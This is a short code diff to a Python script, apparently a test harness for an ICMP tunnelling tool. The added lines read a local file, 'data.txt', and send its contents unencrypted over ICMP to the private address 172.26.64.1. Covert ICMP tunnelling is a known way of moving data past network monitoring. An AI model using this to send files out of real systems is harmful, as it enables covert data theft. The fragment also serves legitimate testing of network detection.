@@ -99,6 +99,12 @@ def icmp_tunnel(hostname: str, data: bytes, filename='', timeout=1000, count=3, 
 
 if __name__ == '__main__':
     
+    FILENAME = 'data.txt'
+    with open(FILENAME, 'rb') as f:
+        data = f.read()
+
+    icmp_tunnel(hostname='172.26.64.1', data=data, filename=FILENAME, count=1, encrypt=False)
+    
     FILENAME = 'data2.txt'
     with open(FILENAME, 'rb') as f:
         data = f.read()
